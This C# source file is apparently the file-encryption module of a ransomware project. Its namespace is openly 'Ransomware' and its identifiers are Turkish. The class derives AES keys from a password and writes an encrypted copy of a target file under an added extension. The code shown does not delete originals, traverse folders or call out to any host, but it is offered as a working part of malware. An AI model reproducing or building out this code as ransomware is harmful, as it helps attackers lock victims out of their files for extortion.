using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;

namespace Ransomware.SistemFonk
{
    class DosyaSifreleyici
    {
        private string key { set; get; }
        private byte[] iv { set; get; }

        RijndaelManaged aes256;
        Rfc2898DeriveBytes rfc2898;
        ICryptoTransform ict;

        public DosyaSifreleyici(string key, byte[] iv)
        {
            aes256 = new RijndaelManaged();
            rfc2898 = new Rfc2898DeriveBytes(key, iv);
            ict = aes256.CreateEncryptor(rfc2898.GetBytes(32), rfc2898.GetBytes(16));
        }

        public void Sifrele(string yol, string uzanti)
        {
            using (FileStream yeniDosya = new FileStream(yol + uzanti, FileMode.Create))
            using (FileStream eskiDosya = new FileStream(yol, FileMode.Open, FileAccess.Read))
            using (CryptoStream sifreleyici = new CryptoStream(yeniDosya, ict, CryptoStreamMode.Write))
            {
                int @byte;
                while ((@byte = eskiDosya.ReadByte()) != -1)
                    sifreleyici.WriteByte((byte)@byte);
            }
        }

    }
}
